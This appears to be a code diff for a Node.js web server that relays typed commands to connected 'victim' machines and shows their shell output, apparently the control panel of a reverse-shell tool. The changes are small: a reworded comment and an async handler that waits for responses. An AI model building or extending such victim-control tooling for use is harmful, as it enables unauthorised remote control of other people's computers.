@@ -93,7 +93,8 @@ app.get('/:ip', checkVictim, function (req, res) {
         // If there is nothing new to display on commandLine, increment timesReloaldedSuccesfully, 
         // else, reset the counter and reload the page (end = false). When the commandLine hasn't 
         // been changed 5 times, stop reloading the page (end = true)
-        // This is done to get the most responses when shell splits one response in many ones (ie. PowerShell)
+        // This is done to get the largest number of responses when shell splits one response in many ones 
+        // (ie. PowerShell)
         if (previousCommandLine == commandLine){
             timesReloadedSuccesfully++;
         }
@@ -108,7 +109,8 @@ app.get('/:ip', checkVictim, function (req, res) {
     }
 })
 
-app.post('/:ip', checkVictim, function (req, res) {
+// Async so whole server doesn't freeze when waiting for the first response
+app.post('/:ip', checkVictim, async function (req, res) {
     let victim = req.victim;
 
     if (!victim){
@@ -120,7 +122,7 @@ app.post('/:ip', checkVictim, function (req, res) {
         commandLine += ' > ' + req.body.command + '\n';
         victim.write(req.body.command + '\n');
         console.log("%s User sent command: %s", date.format(), req.body.command);
-        waitForResponse(victim);
+        await waitForResponse(victim);
         res.render('victim.html', { victim, commandLine, end: false});
     }
 })
